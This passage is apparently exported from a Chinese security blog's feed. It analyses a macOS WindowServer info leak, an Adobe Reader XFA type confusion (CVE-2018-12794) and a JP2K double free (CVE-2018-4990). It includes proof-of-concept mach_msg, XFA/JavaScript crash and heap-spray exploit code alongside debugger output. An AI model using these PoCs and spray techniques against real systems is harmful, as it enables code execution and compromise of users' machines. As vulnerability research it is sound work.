<h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h2><p><code>_FindProcessRecByConnectionID</code> 调用失败后，会用未初始化的栈变量做赋值操作，导致信息泄漏。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">NDR_record_t __usercall _XGetConnectionPSN@&lt;rax&gt;(__int64 a1@&lt;rax&gt;, _DWORD *a2@&lt;rdi&gt;, __int64 a3@&lt;rsi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// ST08_8</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  NDR_record_t result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  savedregs = a1;</span><br><span class="line">  <span class="keyword">if</span> ( *a2 &lt; <span class="number">0</span> || a2[<span class="number">1</span>] != <span class="number">0x24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">32</span>) = <span class="number">-304</span>;</span><br><span class="line">    result = NDR_record;</span><br><span class="line">    *(NDR_record_t *)(a3 + <span class="number">24</span>) = NDR_record;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = FindProcessRecByConnectionID((<span class="keyword">unsigned</span> <span class="keyword">int</span>)a2[<span class="number">8</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *(_QWORD *)(v4 + <span class="number">4</span>);</span><br><span class="line">      v5 = *(_QWORD *)(v4 + <span class="number">4</span>) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">0x24</span>) = v6;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">0x28</span>) = v5;                <span class="comment">// uninitialized</span></span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">0x20</span>) = <span class="number">0</span>;</span><br><span class="line">    result = NDR_record;</span><br><span class="line">    *(NDR_record_t *)(a3 + <span class="number">24</span>) = NDR_record;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">4</span>) = <span class="number">44</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">mach_msg_return_t</span> ret;</span><br><span class="line">	<span class="keyword">leak_msg_t</span> message;</span><br><span class="line">	<span class="keyword">mach_port_t</span> replyPort = mig_get_reply_port();</span><br><span class="line">	<span class="built_in">memset</span>(&amp;message, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));</span><br><span class="line">	message.header.msgh_remote_port = getport;</span><br><span class="line">	message.header.msgh_local_port = replyPort;</span><br><span class="line">	message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);</span><br><span class="line">	message.header.msgh_size = <span class="number">36</span>;</span><br><span class="line">	message.header.msgh_id = <span class="number">0x7210</span> + <span class="number">0xff</span>;</span><br><span class="line">	message.NDR = NDR_record;</span><br><span class="line">	message.size = <span class="number">0</span>;</span><br><span class="line">	message.leak_addr = <span class="number">0x1337</span>; <span class="comment">//if trigger leak bug successfully, it will be change to stack value.</span></span><br><span class="line">	ret = mach_msg(&amp;(message.header), MACH_SEND_MSG | MACH_RCV_MSG,</span><br><span class="line">					<span class="number">36</span>, <span class="number">0xffff</span>, replyPort,</span><br><span class="line">					MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(ret != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">		NSLog(@<span class="string">&quot;mach_msg fail.\n&quot;</span>);</span><br><span class="line">		mach_error(<span class="string">&quot;mach_msg:&quot;</span> , ret);</span><br><span class="line">	&#125;</span><br><span class="line">	stack_addr = <span class="number">0x7fff00000000</span> | message.leak_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写poc的时候发现一个问题，使用之前和<code>fontd</code>交互的代码获取port，然后填充<code>mach msg</code>的<code>remote port</code> 无法触发漏洞，问了下<a href="https://brightiup.me/">brightiup</a>得到了答案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">你获取的这个port是这个mach服务的port，他这个代码里面通过funcptr获得的port是一个对象的port可以理解为一个上下文。其实那个funcptr应该是CGSCreateLayerContext函数。</span><br></pre></td></tr></table></figure>

<p>我获取到的port是没有上下文的，所以无法触发漏洞路径。</p>
<p>重新看了完整利用后，发现这个offset对应的函数应该是 <code>CGSGetConnectionPortById</code>。</p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/theori-io/zer0con2018_singi">zer0con2018_singi</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-12794 分析</title>
    <url>/2019/03/12/CVE-2018-12794-%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 : 漏洞信息"></a>0x00 : 漏洞信息</h2><p>XFA 类型混淆导致OOB的漏洞。</p>
<a id="more"></a>

<h2 id="0x01-PoC"><a href="#0x01-PoC" class="headerlink" title="0x01 : PoC"></a>0x01 : PoC</h2><p>利用脚本把XFA和JS从PDF里拆分出来</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xdp:xdp</span> <span class="attr">xmlns:xdp</span>=<span class="string">&#x27;http://ns.adobe.com/xdp/&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">config</span> <span class="attr">xmlns:xfa</span>=<span class="string">&#x27;http://www.xfa.org/schema/xci/3.1/&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">present</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pdf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interactive</span>&gt;</span></span><br><span class="line">          1</span><br><span class="line">        <span class="tag">&lt;/<span class="name">interactive</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scriptModel</span>&gt;</span></span><br><span class="line">          XFA</span><br><span class="line">        <span class="tag">&lt;/<span class="name">scriptModel</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encryption</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">permissions</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">permissions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encryption</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">pdf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">present</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">acrobat</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">acrobat7</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamicRender</span>&gt;</span></span><br><span class="line">          required</span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamicRender</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">acrobat7</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">acrobat</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">    <span class="tag">&lt;<span class="name">subform</span> <span class="attr">layout</span>=<span class="string">&#x27;tb&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;outerform&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">pageSet</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">pageArea</span> <span class="attr">id</span>=<span class="string">&#x27;Page2&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;Page2&#x27;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">contentArea</span> <span class="attr">h</span>=<span class="string">&#x27;100mm&#x27;</span> <span class="attr">w</span>=<span class="string">&#x27;200mm&#x27;</span> <span class="attr">x</span>=<span class="string">&#x27;0.25in&#x27;</span> <span class="attr">y</span>=<span class="string">&#x27;0.25in&#x27;</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">medium</span> <span class="attr">long</span>=<span class="string">&#x27;297mm&#x27;</span> <span class="attr">short</span>=<span class="string">&#x27;210mm&#x27;</span> <span class="attr">stock</span>=<span class="string">&#x27;a4&#x27;</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">pageArea</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">pageSet</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">		  </span><br><span class="line">		<span class="tag">&lt;<span class="name">subform</span> <span class="attr">name</span>=<span class="string">&quot;sub1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">subform</span>&gt;</span></span><br><span class="line">					</span><br><span class="line">		<span class="tag">&lt;<span class="name">subform</span> <span class="attr">name</span>=<span class="string">&quot;sub2&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">calculate</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">script</span> <span class="attr">contentType</span>=<span class="string">&quot;application/x-javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">					app.alert(<span class="string">&quot;crash...!&quot;</span>);</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">script</span>&gt;</span>					</span><br><span class="line">			<span class="tag">&lt;/<span class="name">calculate</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">subform</span>&gt;</span>	</span><br><span class="line">					</span><br><span class="line">	<span class="tag">&lt;/<span class="name">subform</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xfa:datasets</span> <span class="attr">xmlns:xfa</span>=<span class="string">&#x27;http://www.xfa.org/schema/xfa-data/1.0/&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xdp:xdp</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>js代码如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">o = xfa.resolveNode(<span class="string">&quot;xfa[0].template[0].outerform[0].sub1[0]&quot;</span>); </span><br><span class="line">o2 = xfa.resolveNode(<span class="string">&quot;xfa[0].form[0].outerform[0].sub2[0]&quot;</span>);</span><br><span class="line">o.nodes.append(o2);		</span><br><span class="line">o2.presence = <span class="string">&quot;inactive&quot;</span>;<span class="comment">//will crash here</span></span><br><span class="line">app.alert(<span class="string">&quot;no crash!&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><code>PoC</code>很好懂，就是把o2节点添加为o的子节点，然后访问o2的<code>presence</code>属性，并且赋值，就是访问一次这个属性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(c74.700): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax&#x3D;00000001 ebx&#x3D;00000000 ecx&#x3D;42f2eec0 edx&#x3D;0013d164 esi&#x3D;00000000 edi&#x3D;42f2eec0</span><br><span class="line">eip&#x3D;5c067d77 esp&#x3D;0013cfd8 ebp&#x3D;0013d034 iopl&#x3D;0         nv up ei pl zr na pe nc</span><br><span class="line">cs&#x3D;001b  ss&#x3D;0023  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;003b  gs&#x3D;0000             efl&#x3D;00210246</span><br><span class="line">AcroForm!PlugInMain+0x979d7:</span><br><span class="line">5c067d77 39b7d0010000    cmp     dword ptr [edi+1D0h],esi ds:0023:42f2f090&#x3D;????????</span><br><span class="line"></span><br><span class="line">0:000&gt; k10</span><br><span class="line">ChildEBP RetAddr  </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">0013d034 5c05dd14 AcroForm!PlugInMain+0x979d7</span><br><span class="line">0013d0d0 5c01cc57 AcroForm!PlugInMain+0x8d974</span><br><span class="line">0013d118 5c4dcc55 AcroForm!PlugInMain+0x4c8b7</span><br><span class="line">0013d130 5c05daa4 AcroForm!DllUnregisterServer+0x3367ac</span><br><span class="line">0013d174 5c05d731 AcroForm!PlugInMain+0x8d704</span><br><span class="line">0013d1e8 6e4e90b2 AcroForm!PlugInMain+0x8d391</span><br><span class="line">0013d1ec 770665f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x3162</span><br><span class="line">0013d1f0 7702a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b5</span><br><span class="line">0013d1f4 76ff65a6 ntdll!EtwSetMark+0xe743</span><br><span class="line">0013d1f8 7556c3d4 ntdll!wcsnicmp+0xcaa</span><br><span class="line">0013d1fc 6b09ecfa kernel32!HeapFree+0x14</span><br><span class="line">0013d204 5c32f87d MSVCR120!free+0x1a</span><br><span class="line">00000000 00000000 AcroForm!DllUnregisterServer+0x1893d4</span><br><span class="line"></span><br><span class="line">0:000&gt; dd edi</span><br><span class="line">42f2eec0  5c78061c 00000002 42c64fe8 5c88d328</span><br><span class="line">42f2eed0  00000147 c0c0c0c0 c0c0c0d0 43884fe0</span><br><span class="line">42f2eee0  43404e40 00000000 43832fb0 c0c0c0c2</span><br><span class="line">42f2eef0  42f2eec0 2ff76fd8 00000000 00000000</span><br><span class="line">42f2ef00  2be4cf30 00000015 00000000 5c88f9b4</span><br><span class="line">42f2ef10  5c88d328 43404e40 00000000 00000000</span><br><span class="line">42f2ef20  00000000 00000000 00000004 5c640954</span><br><span class="line">42f2ef30  00000000 5c640954 00000000 42e8afd0</span><br><span class="line">0:000&gt; dd edi+1d0</span><br><span class="line">42f2f090  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0a0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0b0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0c0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0d0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0e0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0f0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f100  ???????? ???????? ???????? ????????</span><br><span class="line"></span><br><span class="line">0:000&gt; !heap -p -a edi</span><br><span class="line">    address 42f2eec0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 1471000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                431b130c:         42f2eec0              140 -         42f2e000             2000</span><br><span class="line">          ? AcroForm!DllUnregisterServer+5da173</span><br><span class="line">    6e4e8e89 verifier!VerifierDisableFaultInjectionExclusionRange+0x00002f39</span><br><span class="line">    77065e26 ntdll!RtlpNtMakeTemporaryKey+0x000040e7</span><br><span class="line">    7702a376 ntdll!EtwSetMark+0x0000ea0f</span><br><span class="line">    76ff5ae0 ntdll!wcsnicmp+0x000001e4</span><br><span class="line">    6b09ed63 MSVCR120!malloc+0x00000033</span><br><span class="line">    5bfd70ed AcroForm!PlugInMain+0x00006d4d</span><br><span class="line">    5c009e2d AcroForm!PlugInMain+0x00039a8d</span><br></pre></td></tr></table></figure>

<p>这是一个越界读。</p>
<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 : 分析"></a>0x02 : 分析</h2><p>首先根据callstack，定位一下漏洞点以及发生oob的对象是啥。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; k10</span><br><span class="line">ChildEBP RetAddr</span><br><span class="line">0013d034 5c05dd14 XFAFormModelImpl__isActivityExcluded </span><br><span class="line">0013d0d0 5c01cc57 AcroForm!PlugInMain+0x8d974</span><br><span class="line">0013d118 5c4dcc55 AcroForm!PlugInMain+0x4c8b7</span><br><span class="line">0013d130 5c05daa4 AcroForm!DllUnregisterServer+0x3367ac</span><br><span class="line">0013d174 5c05d731 sub_208FD8D5</span><br><span class="line">0013d1e8 6e4e90b2 sub_208FD3BA </span><br><span class="line">0013d1ec 770665f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x3162</span><br><span class="line">0013d1f0 7702a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b5</span><br><span class="line">0013d1f4 76ff65a6 ntdll!EtwSetMark+0xe743</span><br><span class="line">0013d1f8 7556c3d4 ntdll!wcsnicmp+0xcaa</span><br><span class="line">0013d1fc 6b09ecfa kernel32!HeapFree+0x14</span><br><span class="line">0013d204 5c32f87d MSVCR120!free+0x1a</span><br><span class="line">00000000 00000000 sub_20BCF7CC &#x2F;&#x2F; free wrp</span><br></pre></td></tr></table></figure>

<p>发生崩溃的函数是在<code>XFAFormModelImpl__isActivityExcluded </code>，这是在操作<code>xfa.form</code>对象，但是却发生了越界。<br>调试发现，此时访问的对象并不是<code>xfa.form</code>对象，而是一个大小为0x140的对象，看下这个对象的分配情况，可以确定这个对象的大小、类型信息。<br>得到这段代码的方法是：首先heap命令得到当前对象的基本情况，找到分配的位置，一般来说c++对象分配是先走malloc之类的分配器（程序可能自己封装malloc）分配内存（对象大小），然后初始化虚表啥的，所以malloc调用往前找一个就找到了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; __unwind &#123; &#x2F;&#x2F; loc_20E3F4E2</span><br><span class="line">push    8</span><br><span class="line">mov     eax, offset loc_20E3F4E2</span><br><span class="line">call    __EH_prolog3</span><br><span class="line">mov     edi, ecx</span><br><span class="line">push    140h            ; size_t 对象大小</span><br><span class="line">call    jfCacheManager_alloc</span><br><span class="line">mov     edx, eax</span><br><span class="line">pop     ecx</span><br></pre></td></tr></table></figure>

<p>交叉引用得到这个对象是一个<code>xfa.template</code>对象，以下是两个对象的情况：</p>
<p><code>xfa.template</code> 对象大小 <code>0x140</code><br><code>xfa.form</code>    对象大小 <code>0x270</code><br>所以这是一个类型混淆漏洞，程序错误的把<code>xfa.template</code>对象当作<code>xfa.form</code>对象来读取数据，导致越界的发生，<code>root cause</code>是类型混淆。</p>
<h2 id="0x03-引用"><a href="#0x03-引用" class="headerlink" title="0x03 : 引用"></a>0x03 : 引用</h2><p><a href="https://www.thezdi.com/blog/2018/9/18/cve-2018-12794-using-type-confusion-to-get-code-execution-in-adobe-reader">using-type-confusion-to-get-code-execution-in-adobe-reader</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-4990 analysis</title>
    <url>/2019/04/06/CVE-2018-4990-analysis/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jp2k的越界读，转换2-free的利用。</span><br></pre></td></tr></table></figure>

<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><p>Win7 x86<br>Adobe Acrobat Reader 2018.011.20036</p>
<a id="more"></a>



<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>一张特殊构造过的JP2K图片<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914054830.jpg" alt="-w650"></p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914250745.jpg" alt="-w640"></p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914374768.jpg" alt="-w641"></p>
<p>大小和内容都是经过构造的，这里先触发一下漏洞，分析漏洞成因。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打开pageheap后，windbg调试。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; r</span><br><span class="line">eax&#x3D;00000000 ebx&#x3D;00000000 ecx&#x3D;6bf58598 edx&#x3D;00000000 esi&#x3D;00000000 edi&#x3D;00000000</span><br><span class="line">eip&#x3D;6bf2ba58 esp&#x3D;00529b04 ebp&#x3D;00529b20 iopl&#x3D;0         nv up ei pl zr na pe nc</span><br><span class="line">cs&#x3D;001b  ss&#x3D;0023  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;003b  gs&#x3D;0000             efl&#x3D;00000246</span><br><span class="line">verifier!VerifierStopMessage+0x1f8:</span><br><span class="line">6bf2ba58 cc              int     3</span><br><span class="line">0:000&gt; k10</span><br><span class="line">ChildEBP RetAddr  </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00529b20 6bf29ee0 verifier!VerifierStopMessage+0x1f8</span><br><span class="line">00529b84 6bf26f11 verifier!VerifierDisableFaultInjectionExclusionRange+0x3f90</span><br><span class="line">0052a16c 6bf26f95 verifier!VerifierDisableFaultInjectionExclusionRange+0xfc1</span><br><span class="line">0052a190 6bf27240 verifier!VerifierDisableFaultInjectionExclusionRange+0x1045</span><br><span class="line">0052a1ac 6bf29080 verifier!VerifierDisableFaultInjectionExclusionRange+0x12f0</span><br><span class="line">0052a1c8 776b65f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x3130</span><br><span class="line">0052a210 7767a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b5</span><br><span class="line">0052a304 776465a6 ntdll!EtwSetMark+0xe743</span><br><span class="line">0052a324 7733c3d4 ntdll!wcsnicmp+0xcaa</span><br><span class="line">0052a338 69feecfa kernel32!HeapFree+0x14</span><br><span class="line">0052a34c 64290574 MSVCR120!free+0x1a</span><br><span class="line">0052a46c 642a6482 JP2KLib!JP2KCopyRect+0xbae6</span><br><span class="line">0052a4c4 65f06a24 JP2KLib!JP2KImageInitDecoderEx+0x24</span><br><span class="line">0052a54c 65f083be AcroRd32_65910000!AX_PDXlateToHostEx+0x2615e5</span><br><span class="line">0052a5ac 65efd459 AcroRd32_65910000!AX_PDXlateToHostEx+0x262f7f</span><br><span class="line">0052a5b8 65f06368 AcroRd32_65910000!AX_PDXlateToHostEx+0x25801a</span><br></pre></td></tr></table></figure>

<p>根据call stack往前找，找漏洞触发的点，着重分析JP2KLib中两个调用。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">JP2KImageInitDecoderEx</span><span class="params">(Concurrency::details::SchedulerBase *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_1004F3BD(a2, a3, a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543015735567.jpg" alt="-w848"></p>
<p>对应的汇编<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543020367641.jpg" alt="-w375"></p>
<p>调试一下这里：<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543023168418.jpg" alt="-w1485"></p>
<p>可以发现，这个循环，每次读取8字节，循环次数<code>0xff</code>次。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> idx = <span class="number">0</span>; idx &lt; <span class="number">0xff</span>; idx++)&#123;</span><br><span class="line">    <span class="comment">//do read work...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后一次循环的时候，idx是<code>0xfe</code>，此时读取到 <code>0xfe * 4</code>。<br>调试发现，<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543026333699.jpg" alt="-w426"></p>
<p>这个buffer size只有<code>0xfd * 4 = 0x3f4</code>这么大，所以导致越界读的发生。</p>
<h2 id="Exploit-分析"><a href="#Exploit-分析" class="headerlink" title="Exploit 分析"></a>Exploit 分析</h2><p>这个利用可以说十分的巧妙，利用js布局内存，把越界读转换成了<code>Double free</code>完成利用。</p>
<p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/CVE-2018-4990">完整Exploit链接</a></p>
<p>因为需要提前做内存布局，不能直接就触发漏洞，所以需要利用js再布局内存完成后，主动地触发漏洞，这里的做法和p2o 2017，360安全团队打Reader的利用套路一样，把图片放嵌入<code>button field</code>,并设置按钮不可显示，在布局完成后，设置按钮属性可显，然后触发漏洞。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a         = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x3000</span>);</span><br><span class="line"><span class="keyword">var</span> spraynum  = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">var</span> sprayarr  = <span class="keyword">new</span> <span class="built_in">Array</span>(spraynum);</span><br><span class="line"><span class="keyword">var</span> spraylen  = <span class="number">0x10000</span>-<span class="number">24</span>;</span><br><span class="line"><span class="keyword">var</span> spraybase = <span class="number">0x0d0e0048</span>;</span><br><span class="line"><span class="keyword">var</span> spraypos  = <span class="number">0x0d0f0058</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// force allocations to prepare the heap for the oob read</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; <span class="number">0x3000</span>; i1++)&#123;</span><br><span class="line">    a[i1] = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">252</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// these will be freed</span></span><br><span class="line">    a[i1][<span class="number">249</span>] = spraybase;</span><br><span class="line">    a[i1][<span class="number">250</span>] = spraybase + <span class="number">0x10000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// heap spray to land ArrayBuffers at 0x0d0e0048 and 0x0d0f0048</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; spraynum; i1++)&#123;</span><br><span class="line">    sprayarr[i1] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(spraylen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// make holes so the oob read chunk lands here</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; <span class="number">0x3000</span>; i1 = i1 + <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="keyword">delete</span> a[i1];</span><br><span class="line">    a[i1] = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内存布局的话，利用中使用了ArrayBuffer，利用堆喷，分配大量连续的Arraybuffer，并<code>make hole</code>，使得图片解析的时候正好分配到内存布局的<code>hole</code>;随后触发越界读，把漏洞转换成double free去利用。</p>
<p>​    利用的后面通过sprayarr2的赋值抢占释放的0x20000内存，一旦抢占成功，sprayarr中之前被释放的elment的长度就会被修改为0x20000；最后通过之前内存布局后精准的内存释放(idx 249,250)获取一个超长element，以实现全局内存读写，再通过全局内存读写，伪造bookmarkRoot的对象实现任意代码执行。</p>
<h2 id="遇到的问题-TODO"><a href="#遇到的问题-TODO" class="headerlink" title="遇到的问题(TODO)"></a>遇到的问题(TODO)</h2><p>win7上这些分析没啥问题，一步步调试，内存布局也没什么问题；在win10上内存布局出现了不连续、失效等情况，这部分<code>TODO</code>，需要解决。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://srcincite.io/blog/2018/05/21/adobe-me-and-a-double-free.html">adobe-me-and-a-double-free</a></p>
<p><a href="https://bbs.pediy.com/thread-250449.htm">对CVE-2018-4990漏洞的补充分析</a></p>
<p><a href="https://ti.360.net/blog/articles/analysis-of-cve-2018-4990/"><strong>CVE-2018-4990 Adobe Reader 代码执行漏洞利用分析</strong></a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Adobe Acrobat Reader</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-2547 分析</title>
    <url>/2019/04/20/CVE-2017-2547-%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="CVE-2017-2547-分析"><a href="#CVE-2017-2547-分析" class="headerlink" title="CVE-2017-2547 分析 "></a>CVE-2017-2547 分析 </h1><p><code>jit bug</code></p>
<p>缺少边界检查导致的越界读.</p>
<a id="more"></a>

<h2 id="0x00-PoC"><a href="#0x00-PoC" class="headerlink" title="0x00 : PoC"></a>0x00 : PoC</h2><p>loki的poc</p>
